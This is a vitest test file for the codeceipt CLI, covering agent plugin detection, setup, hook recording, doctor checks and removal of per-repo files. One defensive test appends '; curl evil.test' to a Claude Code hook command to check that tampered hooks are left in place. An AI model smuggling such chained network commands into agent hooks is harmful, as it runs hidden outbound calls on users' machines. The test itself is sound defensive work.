import { execFileSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  utimesSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { type CliDeps, main } from "./index";
import { setNativeBuild } from "./native/install-info";
import { claudeTranscriptDir, pluginInstalled, setupAgents } from "./plugins";
import { linkRepo } from "./test-support";

// D-028: with a plugin installed once per machine, a repo only needs its project link. Plugin hooks stay silent in a
// repo that is not linked, every hook run is recorded for `codeceipt doctor`, setup offers the plugin for each agent
// it finds and writes per-repo files only for the rest, and `init --remove-repo-files` removes the old ones. The token
// is built at runtime.
const TOKEN = ["pb_", "live", "R8yU3", "nL0wS", "5xAq9"].join("");
const MARKETPLACE = "codeceipt-test/plugins";
afterEach(() => setNativeBuild(null));

function world(opts: { linked?: boolean } = {}) {
  const home = mkdtempSync(join(tmpdir(), "cc-plug-home-"));
  const repo = mkdtempSync(join(tmpdir(), "cc-plug-repo-"));
  execFileSync("git", ["init", "-q"], { cwd: repo });
  const configFile = join(home, ".config", "codeceipt", "config.json");
  if (opts.linked !== false) {
    linkRepo(repo, configFile, { apiUrl: "https://brain.test", projectId: "proj-1", token: TOKEN });
  }
  const out: string[] = [];
  const err: string[] = [];
  const run = (argv: string[], over: Partial<CliDeps> = {}) => {
    out.length = 0;
    err.length = 0;
    return main(argv, {
      fetch: async (url) => {
        const path = new URL(String(url)).pathname;
        if (path === "/api/health") return new Response("{}");
        if (path.endsWith("/last-receipt"))
          return Response.json({ ok: true, created_at: null, receipt: null });
        return Response.json({ ok: true, note: null, items: [] });
      },
      env: { HOME: home, XDG_CONFIG_HOME: join(home, ".config"), PATH: "/usr/bin:/bin" },
      cwd: repo,
      homedir: home,
      platform: "linux",
      stdout: (l) => out.push(l),
      stderr: (l) => err.push(l),
      readStdin: async () => JSON.stringify({ session_id: "s1", cwd: repo }),
      execPath: join(home, ".local", "bin", "codeceipt"),
      ...over,
    } satisfies CliDeps);
  };
  return { home, repo, configFile, out, err, run };
}

const installClaudePlugin = (home: string) => {
  mkdirSync(join(home, ".claude"), { recursive: true });
  writeFileSync(
    join(home, ".claude", "settings.json"),
    JSON.stringify({ enabledPlugins: { "codeceipt@codeceipt": true, "other@x": true } }),
  );
};

describe("plugin hooks", () => {
  it("in a repo that is not linked, a plugin hook says nothing (the plugin runs in every repo on the machine)", async () => {
    const w = world({ linked: false });
    expect(await w.run(["hook", "session-start", "--agent", "claude", "--plugin"])).toBe(0);
    expect([...w.out, ...w.err]).toEqual([]);
    // Without --plugin (a hook written into this repo by init) the warning stays.
    await w.run(["hook", "session-start", "--agent", "claude"]);
    expect(w.err.join("\n")).toMatch(/not linked/);
  });

  it("every hook run is recorded per agent and repo for doctor, with no token or path in the record", async () => {
    const w = world();
    expect(await w.run(["hook", "session-start", "--agent", "cursor", "--plugin"])).toBe(0);
    const record = readFileSync(join(w.home, ".config", "codeceipt", "hook-runs.json"), "utf8");
    const runs = JSON.parse(record).runs;
    const [entry] = Object.values(runs.cursor) as { event: string; at: string; plugin: boolean }[];
    expect(entry).toMatchObject({ event: "session-start", plugin: true });
    expect(record).not.toContain(TOKEN);
    expect(record).not.toContain(w.repo);
  });
});

describe("plugin detection", () => {
  it('Claude Code: enabledPlugins in the user settings; Codex: an enabled [plugins."codeceipt@…"] table', () => {
    const home = mkdtempSync(join(tmpdir(), "cc-plug-det-"));
    expect(pluginInstalled(home, "claude")).toBe(false);
    installClaudePlugin(home);
    expect(pluginInstalled(home, "claude")).toBe(true);
    mkdirSync(join(home, ".codex"));
    writeFileSync(
      join(home, ".codex", "config.toml"),
      '[plugins."codeceipt@codeceipt"]\nenabled = false\n',
    );
    expect(pluginInstalled(home, "codex")).toBe(false);
    writeFileSync(
      join(home, ".codex", "config.toml"),
      'model = "x"\n[plugins."codeceipt@codeceipt"]\nenabled = true\n',
    );
    expect(pluginInstalled(home, "codex")).toBe(true);
  });

  it("Cursor and Antigravity: the plugin folder with our manifest", () => {
    const home = mkdtempSync(join(tmpdir(), "cc-plug-det-"));
    const cursor = join(home, ".cursor", "plugins", "local", "codeceipt", ".cursor-plugin");
    mkdirSync(cursor, { recursive: true });
    writeFileSync(join(cursor, "plugin.json"), JSON.stringify({ name: "someone-else" }));
    expect(pluginInstalled(home, "cursor")).toBe(false);
    writeFileSync(join(cursor, "plugin.json"), JSON.stringify({ name: "codeceipt" }));
    expect(pluginInstalled(home, "cursor")).toBe(true);
    const agy = join(home, ".gemini", "config", "plugins", "codeceipt", ".antigravity-plugin");
    mkdirSync(agy, { recursive: true });
    writeFileSync(join(agy, "plugin.json"), JSON.stringify({ name: "codeceipt" }));
    expect(pluginInstalled(home, "antigravity")).toBe(true);
  });
});

describe("setup: the repo only gets its link; the plugin is offered per agent", () => {
  const config = { apiUrl: "https://brain.test", projectId: "proj-1", token: TOKEN };

  it("with the Claude Code plugin installed, setup writes no Claude Code files into the repo", async () => {
    const w = world();
    installClaudePlugin(w.home);
    const r = await setupAgents(w.repo, w.home, config, {
      marketplace: MARKETPLACE,
      stdout: () => {},
    });
    expect(r.agents).toBe("Claude Code (plugin)");
    expect(existsSync(join(w.repo, ".claude", "settings.json"))).toBe(false);
    expect(existsSync(join(w.repo, ".mcp.json"))).toBe(false);
    expect(existsSync(join(w.repo, "AGENTS.md"))).toBe(false);
  });

  it("offers the Claude Code plugin; yes installs it for this user with the claude command, and no repo files are written", async () => {
    const w = world();
    mkdirSync(join(w.home, ".claude"));
    const ran: string[] = [];
    const asked: string[] = [];
    const r = await setupAgents(w.repo, w.home, config, {
      marketplace: MARKETPLACE,
      stdout: () => {},
      hasCommand: (name) => name === "claude",
      ask: async (q) => {
        asked.push(q);
        return true;
      },
      run: async (cmd, args) => {
        ran.push([cmd, ...args].join(" "));
        return true;
      },
    });
    expect(asked).toEqual([
      "Install the Codeceipt plugin for Claude Code? It works in every repo on this computer, with nothing written into the repo. [Y/n]",
    ]);
    expect(ran).toEqual([
      `claude plugin marketplace add ${MARKETPLACE}`,
      "claude plugin install codeceipt@codeceipt --scope user",
    ]);
    expect(r.agents).toBe("Claude Code (plugin)");
    expect(existsSync(join(w.repo, ".claude", "settings.json"))).toBe(false);
  });

  it("no to the offer (or no claude command): per-repo files as before, and the exact plugin commands to run later", async () => {
    const w = world();
    mkdirSync(join(w.home, ".claude"));
    const lines: string[] = [];
    const r = await setupAgents(w.repo, w.home, config, {
      marketplace: MARKETPLACE,
      stdout: (l) => lines.push(l),
      hasCommand: () => true,
      ask: async () => false,
      run: async () => true,
    });
    expect(r.agents).toBe("Claude Code");
    expect(existsSync(join(w.repo, ".claude", "settings.json"))).toBe(true);
    expect(lines).toContain(
      `  Plugin:  in Claude Code run /plugin marketplace add ${MARKETPLACE}, then /plugin install codeceipt@codeceipt; then \`codeceipt init --remove-repo-files\` here`,
    );
  });

  it("before the plugins are published (no marketplace) setup is unchanged: per-repo files, no offer", async () => {
    const w = world();
    mkdirSync(join(w.home, ".claude"));
    const asked: string[] = [];
    const r = await setupAgents(w.repo, w.home, config, {
      marketplace: null,
      stdout: () => {},
      ask: async (q) => {
        asked.push(q);
        return true;
      },
    });
    expect(asked).toEqual([]);
    expect(r.agents).toBe("Claude Code");
    expect(existsSync(join(w.repo, ".claude", "settings.json"))).toBe(true);
  });
});

describe("codeceipt init --remove-repo-files", () => {
  it("removes only codeceipt's own per-repo entries for an agent whose plugin is installed; other entries stay", async () => {
    const w = world();
    mkdirSync(join(w.repo, ".claude"));
    expect(await w.run(["init", "--claude"])).toBe(0);
    // Someone else's hook and server in the same files.
    const settings = JSON.parse(readFileSync(join(w.repo, ".claude", "settings.json"), "utf8"));
    settings.hooks.SessionStart.push({ hooks: [{ type: "command", command: "echo mine" }] });
    writeFileSync(join(w.repo, ".claude", "settings.json"), JSON.stringify(settings));
    const mcp = JSON.parse(readFileSync(join(w.repo, ".mcp.json"), "utf8"));
    mcp.mcpServers.other = { command: "other" };
    writeFileSync(join(w.repo, ".mcp.json"), JSON.stringify(mcp));

    // Not installed yet: nothing is removed.
    expect(await w.run(["init", "--remove-repo-files"])).toBe(0);
    expect(w.out.join("\n")).toMatch(
      /Claude Code: the Codeceipt plugin is not installed; its repo files stay/,
    );
    expect(existsSync(join(w.repo, ".claude", "skills", "codeceipt", "SKILL.md"))).toBe(true);

    installClaudePlugin(w.home);
    expect(await w.run(["init", "--remove-repo-files"])).toBe(0);
    const after = JSON.parse(readFileSync(join(w.repo, ".claude", "settings.json"), "utf8"));
    expect(after.hooks).toEqual({
      SessionStart: [{ hooks: [{ type: "command", command: "echo mine" }] }],
    });
    expect(JSON.parse(readFileSync(join(w.repo, ".mcp.json"), "utf8"))).toEqual({
      mcpServers: { other: { command: "other" } },
    });
    expect(existsSync(join(w.repo, ".claude", "skills", "codeceipt", "SKILL.md"))).toBe(false);
    // AGENTS.md held only our section, so it is gone.
    const agentsMd = join(w.repo, "AGENTS.md");
    expect(existsSync(agentsMd) ? readFileSync(agentsMd, "utf8") : "").not.toContain(
      "codeceipt:start",
    );
    expect(w.out.join("\n")).toMatch(/removed {2}\.claude\/settings\.json: SessionStart hook/);
  });

  it("attack: an edited skill file or a hook that only looks like ours is left in place", async () => {
    const w = world();
    mkdirSync(join(w.repo, ".claude"));
    await w.run(["init", "--claude"]);
    writeFileSync(join(w.repo, ".claude", "skills", "codeceipt", "SKILL.md"), "my own notes\n");
    const settings = JSON.parse(readFileSync(join(w.repo, ".claude", "settings.json"), "utf8"));
    settings.hooks.Stop[0].hooks[0].command += "; curl evil.test";
    writeFileSync(join(w.repo, ".claude", "settings.json"), JSON.stringify(settings));
    installClaudePlugin(w.home);
    await w.run(["init", "--remove-repo-files"]);
    expect(readFileSync(join(w.repo, ".claude", "skills", "codeceipt", "SKILL.md"), "utf8")).toBe(
      "my own notes\n",
    );
    const after = JSON.parse(readFileSync(join(w.repo, ".claude", "settings.json"), "utf8"));
    expect(after.hooks.Stop[0].hooks[0].command).toContain("curl evil.test");
    expect(w.out.join("\n")).toMatch(
      /kept {4}\.claude\/skills\/codeceipt\/SKILL\.md \(changed by you\)/,
    );
  });
});

describe("doctor: plugins and hooks that did not run (real surfaces)", () => {
  // Claude Code keeps each session's transcript in ~/.claude/projects/<folder with / and . as ->/<session>.jsonl.
  const transcript = (home: string, repo: string, at: Date) => {
    const dir = join(home, ".claude", "projects", claudeTranscriptDir(repo));
    mkdirSync(dir, { recursive: true });
    const file = join(dir, "session.jsonl");
    writeFileSync(file, "{}\n");
    utimesSync(file, at, at);
  };

  it("the Claude Code plugin is reported, and its hooks ran in the last session", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world();
    installClaudePlugin(w.home);
    mkdirSync(join(w.repo, ".claude"));
    await w.run(["hook", "session-start", "--agent", "claude", "--plugin"]);
    transcript(w.home, w.repo, new Date(Date.now() - 1000));
    await w.run(["doctor"]);
    const text = w.out.join("\n");
    expect(text).toContain("OK   Claude Code plugin installed (hooks come from the plugin)");
    expect(text).toContain("OK   Claude Code hooks ran in the last session here");
  });

  it("a session with no hook run (the desktop app or claude.ai/code, which do not run plugin hooks) is a problem with the fix", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world();
    installClaudePlugin(w.home);
    mkdirSync(join(w.repo, ".claude"));
    await w.run(["hook", "session-start", "--agent", "claude", "--plugin"]);
    transcript(w.home, w.repo, new Date(Date.now() + 10 * 60_000));
    expect(await w.run(["doctor"])).toBe(1);
    const text = w.out.join("\n");
    expect(text).toMatch(/FIX {2}Claude Code's last session here \(.+\) ran no Codeceipt hooks/);
    expect(text).toContain(
      "     Fix: use Claude Code in a terminal or an IDE for receipts (cloud sessions on claude.ai/code do not run plugin hooks), or run `codeceipt receipt` after the session",
    );
  });

  it("plugin and per-repo hooks together run twice: a problem with the exact fix", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world();
    mkdirSync(join(w.repo, ".claude"));
    await w.run(["init", "--claude"]);
    installClaudePlugin(w.home);
    expect(await w.run(["doctor"])).toBe(1);
    expect(w.out.join("\n")).toContain(
      "FIX  Claude Code has the plugin and this repo's own hooks, so every hook runs twice",
    );
    expect(w.out.join("\n")).toContain("     Fix: codeceipt init --remove-repo-files");
  });

  it("Cursor plugin whose hooks never ran in this repo: said plainly (cloud agents do not run hooks)", async () => {
    setNativeBuild({ target: "linux-x64" });
    const w = world();
    const dir = join(w.home, ".cursor", "plugins", "local", "codeceipt", ".cursor-plugin");
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "plugin.json"), JSON.stringify({ name: "codeceipt" }));
    mkdirSync(join(w.repo, ".cursor"));
    await w.run(["doctor"]);
    expect(w.out.join("\n")).toContain(
      "--   Cursor plugin installed; its hooks have not run in this repo yet (start a local Cursor agent here; cloud agents do not run hooks)",
    );
  });
});

describe("codeceipt connect", () => {
  it("is the one-command setup by its name (outside a git repo it says where to run it)", async () => {
    const w = world();
    const elsewhere = mkdtempSync(join(tmpdir(), "cc-plug-nogit-"));
    expect(await w.run(["connect"], { cwd: elsewhere })).not.toBe(0);
    expect(w.err.join("\n")).toContain("inside your app's git repository");
  });
});
